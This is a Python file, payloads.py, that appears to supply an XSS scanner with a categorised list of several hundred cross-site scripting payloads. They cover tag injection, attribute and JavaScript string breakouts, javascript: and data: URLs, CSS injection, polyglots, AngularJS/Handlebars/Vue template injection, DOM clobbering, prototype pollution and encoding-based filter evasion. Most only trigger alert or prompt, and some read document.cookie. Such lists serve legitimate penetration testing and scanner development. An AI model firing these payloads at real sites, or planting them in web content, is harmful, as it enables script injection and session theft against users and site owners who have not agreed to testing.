# payloads.py

DEFAULT_XSS_PAYLOADS = {
    # 1. HTML Tag Injection (Basic → Intermediate → Advanced → Obscure)
    "html_tag_injection": [
        # Basic
        "<script>alert(1)</script>",
        "<script>prompt(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "<img src='x' onerror='prompt(document.domain)'>",
        "<iframe src=javascript:alert(1)></iframe>",
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        # Intermediate
        "<svg onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><script><![CDATA[alert(document.domain)]]></script></svg>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        '<object data=javascript:alert(1) type="text/html"></object>',
        "<embed src=javascript:alert(1)>",
        "<math><mi href=javascript:alert(1)>X</mi></math>",
        "<body onload=alert(1)>",
        # Advanced
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        "<style>@import 'javascript:alert(1)';</style>",
        '<base href="javascript:alert(1)//">',
        '<form action="javascript:alert(1)"><input type=submit></form>',
        "<keygen autofocus onfocus=alert(1)>",
        "<menuitem icon=javascript:alert(1)>",
        "<marquee onstart=alert(1)>",
        "<frame src=javascript:alert(1)>",
        "<frameset><frame src=javascript:alert(1)></frameset>",
        '<table background="javascript:alert(1)">',
        "<tr background=javascript:alert(1)>",
        "<td background=javascript:alert(1)>",
        # Obscure / Edge-case
        '<svg><foreignObject onload=alert(1) xmlns="http://www.w3.org/2000/svg"></foreignObject></svg>',
        '<xml id="xss"><script>alert(1)</script></xml>',
        "<style>@keyframes x{};svg{animation:x 0s oniteration:alert(1)}</style>",
        '<iframe srcdoc="<svg onload=alert(1)>"></iframe>',
        "<noscript><iframe src=javascript:alert(1)></iframe></noscript>",
        "<textarea autofocus onfocus=alert(1)>foo</textarea>",
        "<xmp><script>alert(1)</script></xmp>",
        "<plaintext><script>alert(1)</script>",
        "<ins><script>alert(1)</script></ins>",
        "<del><script>alert(1)</script></del>",
        '<iframe sandbox allow-scripts srcdoc="<script>alert(1)</script>"></iframe>',
        "<a href=javascript:alert(1)>click me</a>",
    ],
    # 2. Attribute Breakout (double-quote & single-quote, event handlers & CSS expressions)
    "attribute_breakout_dq": [
        # Basic
        '"><script>alert(1)</script>',
        '" autofocus onfocus=alert(1) x="',
        '" onmouseover=alert(1) x="',
        '" onclick=alert(1) x="',
        '" src="x" onerror=alert(1) x="',
        # Intermediate
        '" onkeydown=alert(1) x="',
        '" oninput=alert(1) x="',
        '" onblur=alert(1) x="',
        '" onmouseenter=alert(1) x="',
        '" onmouseleave=alert(1) x="',
        '" style="x:expression(alert(1))" x="',
        '" draggable=javascript:alert(1) x="',
        '" formaction="javascript:alert(1)" x="',
        '" data-src="javascript:alert(1)" x="',
        # Advanced
        "\" onfocus=eval('alert(1)') x=\"",
        '" onfocus=window x="',
        '" style="background-image:url(javascript:alert(1))" x="',
        '" style="width:expression(alert(1))" x="',
        '" onkeyup=alert(1) x="',
        '" onwheel=alert(1) x="',
        '" onselect=alert(1) x="',
        '" onpointerdown=alert(1) x="',
        # Obscure / Edge-case
        '" onreset=alert(1) x="',
        '" onsearch=alert(1) x="',
        '" onafterprint=alert(1) x="',
        '" onbeforeprint=alert(1) x="',
        '" onvisibilitychange=alert(1) x="',
        '" style="-moz-binding:url(\'javascript:alert(1)\')" x="',
        '" xml:lang="en" xmlns="javascript:alert(1)" x="',
        '" sandbox="allow-scripts" srcdoc="<script>alert(1)</script>" x="',
    ],
    "attribute_breakout_sq": [
        # Basic
        "'><script>alert(1)</script>",
        "' autofocus onfocus=alert(1) x='",
        "' onmouseover=alert(1) x='",
        "' onclick=alert(1) x='",
        "' src='x' onerror=alert(1) x='",
        # Intermediate
        "' onkeydown=alert(1) x='",
        "' oninput=alert(1) x='",
        "' onblur=alert(1) x='",
        "' onmouseenter=alert(1) x='",
        "' onmouseleave=alert(1) x='",
        "' style='x:expression(alert(1))' x='",
        "' draggable=javascript:alert(1) x='",
        "' formaction='javascript:alert(1)' x='",
        "' data-src='javascript:alert(1)' x='",
        # Advanced
        "' onfocus=eval('alert(1)') x='",
        "' onfocus=window x='",
        "' style='background-image:url(javascript:alert(1))' x='",
        "' style='width:expression(alert(1))' x='",
        "' onkeyup=alert(1) x='",
        "' onwheel=alert(1) x='",
        "' onselect=alert(1) x='",
        "' onpointerdown=alert(1) x='",
        # Obscure / Edge-case
        "' onreset=alert(1) x='",
        "' onsearch=alert(1) x='",
        "' onafterprint=alert(1) x='",
        "' onbeforeprint=alert(1) x='",
        "' onvisibilitychange=alert(1) x='",
        "' style='-moz-binding:url(\"javascript:alert(1)\")' x='",
        "' xml:lang='en' xmlns='javascript:alert(1)' x='",
        "' sandbox='allow-scripts' srcdoc=\"<script>alert(1)</script>\" x='",
    ],
    # 3. JS String Breakout (double-quote & single-quote, dengan chaining & window reference)
    "js_string_breakout_dq": [
        # Basic
        '";alert(1);//',
        '";prompt(document.domain);//',
        '";console.log(document.cookie);//',
        # Intermediate
        '"+alertXSS;//',
        '"+promptXSS;//',
        '";window;//',
        '";window.prompt(document.domain);//',
        "\";eval('alert(1)');//",
        # Advanced
        "\";new Function('alert(1)')();//",
        "\";import('data:text/javascript,alert(1)');//",
        '";document.body.innerHTML=prompt(document.domain);//',
        "\";location='javascript:alert(1)';//",
        '";throw document.domain;//',
        # Obscure / Edge-case
        '";/*--><script>alert(1)</script>/*',
        '";alert(1);//',
        "\";0.constructor.constructor('alert(1)')();//",
        "\";[].filter.constructor('alert(1)')();//",
        '";${alert(1)};//',
        '";/*--><svg/onload=alert(1)>//',
        '";String.fromCharCode(97,108,101,114,116)(1);//',
    ],
    "js_string_breakout_sq": [
        # Basic
        "';alert(1);//",
        "';prompt(document.domain);//",
        "';console.log(document.cookie);//",
        # Intermediate
        "'+alertXSS;//",
        "'+promptXSS;//",
        "';window;//",
        "';window.prompt(document.domain);//",
        "';eval('alert(1)');//",
        # Advanced
        "';new Function('alert(1)')();//",
        "';import('data:text/javascript,alert(1)');//",
        "';document.body.innerHTML=prompt(document.domain);//",
        "';location='javascript:alert(1)';//",
        "';throw document.domain;//",
        # Obscure / Edge-case
        "';/*--><script>alert(1)</script>/*",
        "';}alert(1)};//",
        "';0.constructor.constructor('alert(1)')();//",
        "';[].filter.constructor('alert(1)')();//",
        "';${alert(1)};//",
        "';/*--><svg/onload=alert(1)>//",
        "';String.fromCharCode(97,108,101,114,116)(1);//",
        # Bracket-chaining via filter → constructor
        " ];[]['filter']['constructor']('alert(1)')();//",
        # Variasi dengan sort()
        " ];[]['sort']['constructor']('alert(1)')();//",
        # Memanggil alert via window lookup
        " ];window;//",
        # Memanfaatkan this dan chaining constructor
        " ];this['constructor']['constructor']('alert(1)')();//",
        # Mix array + template literal
        " ];[constructor]['constructor']('alert(1)')();//",
    ],
    # 4. URL-Based Payloads (javascript:, data: URIs, vbscript, livescript, UTF-7/UTF-16)
    "url_based": [
        # Basic
        "javascript:alert(1)",
        "javascript:prompt(document.domain)",
        "javascript:console.log(document.cookie)",
        # Intermediate
        "vbscript:msgbox(document.domain)",
        "livescript:prompt(document.domain)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;charset=utf-8,<svg onload=alert(1)>",
        # Advanced
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E",
        "data:,<svg onload=alert(1)>",
        "data:application/javascript,alert(1)",
        # Obscure / Edge-case
        "utf7+:<script>alert(1)</script>",
        "data:text/html;charset=utf-7,+ADw-script-AD5hbGVydCgxKTw-",
        "javascript\u003aalert(1)",
        "ja\va\0script:alert(1)",
        "mhtml:c:\\/\\\\malicious_mhtml_file!xss.html",
        "filesystem:javascript:alert(1)",
        "blob:javascript:alert(1)",
        "data:application/x-msdownload;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/xml,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Csvg%20onload%3Dalert(1)%3E",
    ],
    # 5. CSS Injection (expression, url())
    "css_injection": [
        # Basic
        '<div style="background-image:url(javascript:alert(1))">x</div>',
        '<p style="width:expression(alert(1))">x</p>',
        "<body style=\"background:url('javascript:prompt(document.domain)')\">",
        # Intermediate
        "<div style=\"list-style-image:url(javascript:confirm('XSS'))\">x</div>",
        "<style>@import 'javascript:alert(1)';</style>",
        "<style>*{background:url(javascript:alert(1))}</style>",
        "<style>body{behavior:url('javascript:alert(1)')}</style>",
        '<div style="background-image:url(data:text/html,<script>alert(1)</script>)">x</div>',
        # Advanced
        "<style>@keyframes x{}@-webkit-keyframes x{};svg{animation:x 0s oniteration:alert(1)}</style>",
        '<svg style="animation-name:x;animation-duration:0s" onanimationiteration="alert(1)"></svg>',
        '<div style="background-image:url(javascript\\3A alert(1))">x</div>',
        "<div style=\"filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='javascript:alert(1)')\">x</div>",
        '<style>@namespace x url("javascript:alert(1)");</style>',
        "<style>@-moz-document url-prefix(){body{background:url(javascript:alert(1))}}</style>",
        # Obscure / Edge-case
        "<style>@supports(selector(:focus)){body:focus{background:url(javascript:alert(1))}}</style>",
        "<div style=\"background-image:url('ja\nvascript:alert(1)')\">x</div>",
        "<style>@import url('jav\\x61script:alert(1)');</style>",
        "<style>*{background:url(&#106avascript:alert(1))}</style>",
        "<style>*{background:url('data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E')}</style>",
    ],
    # 6. Polyglot Payloads (kombo komentar, tag, CSS, JS)
    "polyglot": [
        # Basic
        "<!--><script>alert(1)</script>",
        "\"'><img src=x onerror=alert(1)>",
        "'\"><svg/onload=alert(1)></svg>",
        '<!--"--><body onload=alert(1)>',
        # Intermediate
        '"--></style><script>alert(1)</script><!--',
        "'--><svg><script>alert(1)</script></svg><!--'",
        '";alert(1)//--><svg onload=alert(1)>',
        "';prompt(document.domain);//--><img src=x onerror=prompt(document.domain)>",
        # Advanced
        "\"--><style>@import 'javascript:alert(1)';</style><svg onload=alert(1)>",
        "'--><math><mi href='javascript:alert(1)'>X</mi></math><!--'",
        '"--><iframe srcdoc="<svg onload=alert(1)>"></iframe><!--',
        "'--><form action=\"javascript:alert(1)\"><input type=submit></form><!--'",
        # Obscure / Edge-case
        '"--><xmp><script>alert(1)</script></xmp><!--',
        "'--><plaintext><svg onload=alert(1)></plaintext><!--'",
        "\"--><style>*{behavior:url('javascript:alert(1)')}</style><!--",
        "'--><meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        '"--><table background="javascript:alert(1)"><tr><td>x</td></tr></table><!--',
        '\'--><div style="animation-name:x;animation-duration:0s" onanimationiteration="alert(1)"></div><!--\'',
        '"--><menuitem icon=javascript:alert(1)><!--',
        "'--><marquee onstart=alert(1)><!--'",
        "\"--><svg><foreignObject onload=alert(1) xmlns='http://www.w3.org/1999/xhtml'></foreignObject></svg><!--",
        "'--><style>@keyframes x{};svg{animation:x 0s oniteration:alert(1)}</style><!--'",
    ],
    # 7. Template Engine Injection (AngularJS, Handlebars, Vue)
    "template_engine": [
        # Basic AngularJS
        "{{alert(1)}}",
        "{{constructor.constructor('alert(1)')()}}",
        # Intermediate AngularJS
        '<div ng-init="alert(1)"></div>',
        '<img ng-src="javascript:alert(1)">',
        '<svg ng-onload="alert(1)"></svg>',
        '<a ng-href="javascript:alert(1)">click</a>',
        # Advanced AngularJS
        '<input ng-model="user" ng-change="alert(1)">',
        "{{'XSS'.constructor.constructor('alert(1)')()}}",
        # Basic Handlebars
        '{{alert "XSS"}}',
        '{{{alert "XSS"}}}',
        # Intermediate Handlebars
        '{{#with "foo" as |f|}}{{f.constructor.constructor("alert(1)")()}}{{/with}}',
        "{{#each this.constructor.constructor('return [1]')() as |n|}}{{n}}{{/each}}",
        # Advanced Handlebars
        "<script type=\"text/x-handlebars-template\">{{#with this}}{{constructor.constructor('alert(1)')()}}{{/with}}</script>",
        "{{lookup window 'alert'(1)}}",
        # Basic Vue.js
        "{{alert(1)}}",
        '<button @click="alert(1)">Click me</button>',
        '<img v-bind:src="javascript:alert(1)">',
        "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
        # Intermediate Vue.js
        "<div :title=\"constructor.constructor('alert(1)')()\"></div>",
        "<component :is=\"constructor.constructor('alert(1)')()\"></component>",
        '<template v-if="alert(1)"></template>',
        # Obscure / Edge-case
        "{{ this.constructor.constructor('alert(1)')() }}",
        "{{ ({}).toString.constructor('alert(1)')() }}",
    ],
    # 8. DOM Clobbering & Prototype Pollution
    "dom_clobbering": [
        # Basic – mengganti fungsi bawaan
        "<script>window.alert=console.log;alert(1)</script>",
        "<script>delete window.alert;window.alert=function(x){console.warn(x)};alert('XSS');</script>",
        # Intermediate – clobber properti window via elemen dengan name/id
        "<iframe name=length src=about:blank></iframe><script>alert(length);</script>",
        "<div id=document></div><script>alert(document);</script>",
        "<button name=confirm></button><script>confirm('XSS');</script>",
        "<div id=top></div><script>alert(top);</script>",
        "<iframe name=parent src=about:blank></iframe><script>alert(parent);</script>",
        # Clobber event handlers via prototype
        "<script>Element.prototype.onclick=()=>prompt(document.domain);document.body.click();</script>",
        "<script>HTMLFormElement.prototype.submit=()=>alert(1);document.forms[0].submit();</script>",
        # Advanced – prototype pollution via getters/setters
        "<script>Object.prototype.toString=()=>{alert(document.domain)};({}).toString();</script>",
        "<script>Object.prototype.__defineGetter__('polluted',function(){alert(1)});({}).polluted;</script>",
        "<script>Object.prototype.__defineSetter__('x',()=>alert(1));let o={};o.x=1;</script>",
        "<script>window.__proto__.prompt=()=>alert(document.cookie);prompt();</script>",
        # Obscure / Edge-case – chaining constructor & deleting native methods
        "<script>Object.prototype.constructor.constructor('alert(1)')();</script>",
        "<script>delete HTMLElement.prototype.click;HTMLElement.prototype.click=()=>alert(1);document.body.click();</script>",
        "<form name=location><input name=href></form><script>alert(location.href);</script>",
    ],
    # 9. Event Handler Chaos (Basic → Intermediate → Advanced → Obscure)
    "event_handler": [
        # Basic
        "<div onfocus=alert(1) tabindex=1>focus me</div>",
        "<button onclick=alert(1)>click me</button>",
        "<span onmouseover=alert(1)>hover me</span>",
        "<input onchange=alert(1) value='change me'>",
        "<form onsubmit=alert(1)><input type=submit></form>",
        # Intermediate
        "<div onblur=alert(1) tabindex=1>blur me</div>",
        "<section onload=alert(1)>should never fire?</section>",
        "<body onunload=alert(1)>",
        "<textarea onselect=alert(1)>select text</textarea>",
        "<a oncontextmenu=alert(1) href='#'>right-click me</a>",
        "<div onscroll=alert(1) style='height:10px;overflow:auto;'>…</div>",
        "<div onresize=alert(1) style='resize:both;overflow:auto;'>resize me</div>",
        # Advanced
        "<svg onmouseenter=alert(1)>enter SVG</svg>",
        "<svg onmouseleave=alert(1)>leave SVG</svg>",
        "<div onpointerdown=alert(1) tabindex=0>pointer down</div>",
        "<div onpointerenter=alert(1) tabindex=0>pointer enter</div>",
        "<div onpointerleave=alert(1) tabindex=0>pointer leave</div>",
        "<div ontouchstart=alert(1)>touch start</div>",
        "<div ontouchend=alert(1)>touch end</div>",
        "<div onwheel=alert(1)>scroll wheel</div>",
        "<div onkeyup=alert(1) tabindex=0>keyup</div>",
        "<div onkeydown=alert(1) tabindex=0>keydown</div>",
        "<div onanimationstart=alert(1) style='animation:x 1s'>anim start</div>",
        "<div onanimationiteration=alert(1) style='animation:x 1s infinite'>anim iter</div>",
        "<div onanimationend=alert(1) style='animation:x 1s'>anim end</div>",
        "<div ontransitionend=alert(1) style='transition:all 1s'>trans end</div>",
        # Obscure / Edge-case
        "<div oncopy=alert(1)>copy me</div>",
        "<div oncut=alert(1)>cut me</div>",
        "<div onpaste=alert(1)>paste me</div>",
        "<div onhashchange=alert(1)>hash change</div>",
        "<div onpopstate=alert(1)>pop state</div>",
        "<div onstorage=alert(1)>storage event</div>",
        "<div onpagehide=alert(1)>page hide</div>",
        "<div onpageshow=alert(1)>page show</div>",
        "<video oncanplay=alert(1) src=x></video>",
        "<audio onpause=alert(1) src=x></audio>",
        "<script onreadystatechange=if(this.readyState=='complete')alert(1)></script>",
        "<fieldset onpointercancel=alert(1)>pointer cancel</fieldset>",
        "<fieldset ongotpointercapture=alert(1)>got capture</fieldset>",
        "<fieldset onlostpointercapture=alert(1)>lost capture</fieldset>",
        "<div onbeforeunload=alert(1)>leaving?</div>",
    ],
    # 10. Advanced Encodings (Hex, Unicode escapes, percent-encoding, entities, double-encoding, BOM, UTF-7, etc.)
    "encoding": [
        # Basic hex & Unicode escapes
        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
        "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
        "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3ealert(1)\\x3c/script\\x3e",
        "\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003ealert(1)\\u003c/script\\u003e",
        # HTML numeric entities
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        "&#0060;script&#0062;alert(1)&#0060;/script&#0062;",
        # Percent-encoding (single & mixed case, full & partial)
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%3c%73%63%72%69%70%74%3ealert(1)%3c/script%3e",
        "%3C%73cript%3Ealert(1)%3C/script%3E",
        "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
        "%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003ealert(1)%u003c/script%u003e",
        "%00%3Cscript%3Ealert(1)%3C/script%3E",  # leading null
        # Mixed entity + percent
        "&#x3c;%73cript&#x3e;alert(1)&#x3c;/script&#x3e;",
        "&#0060;script%3Ealert(1)%3C/script&#0062;",
        # BOM (UTF-8 BOM prefix) + percent
        "%EF%BB%BF%3Cscript%3Ealert(1)%3C/script%3E",
        # Double-encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",
        # In-string encoding variations
        "javasc\\u0072ipt:alert(1)",
        "javasc\\x72ipt:alert(1)",
        "javascript&#x3A;alert(1)",
        # UTF-7
        "+ADw-script-AD5hbGVydCgxKTw-+ADw-/script-AD4-",
        # Combined encodings
        "&#x00;&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "\ufeff<script>alert(1)</script>",  # Zero-width no-break space (BOM)
        # Obscure: encoded in attribute context
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%31%29'))>",
    ],
}
